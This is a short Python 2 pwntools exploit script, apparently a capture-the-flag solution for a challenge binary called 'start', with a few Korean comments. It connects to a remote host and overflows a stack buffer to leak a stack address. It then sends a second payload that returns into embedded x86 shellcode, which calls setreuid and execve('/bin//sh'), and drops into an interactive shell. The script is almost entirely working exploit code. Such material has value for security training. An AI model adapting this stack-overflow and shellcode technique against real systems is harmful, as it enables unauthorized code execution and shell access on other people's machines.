#-*- coding: utf-8 -*-
from pwn import *

p=remote("203.229.206.21",10013)
#p = process(["./start"])

sleep(0.4)
print p.recvuntil(":")
#p.sendline("\n")

shellcode = "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

payload = "a"*20 #스택에 올라갈 값들 
payload += p32(0x08048087) #돌아가는 주소 변조
pause()
p.send(payload)

leak_addr = u32(p.recv(4))+20 # esp 가 20만큼 상승한 상태에서 다시 스택 쌓기 시작함. 고로 쉘코드의 주소 = 

print "leak : "+hex(leak_addr)

sleep(0.4)

payload2 = "b"*20 
#payload2 += "c"*4
payload2 += p32(leak_addr)
#payload2 += "d"*4
payload2 += shellcode
#pause()
p.send(payload2)

p.interactive()
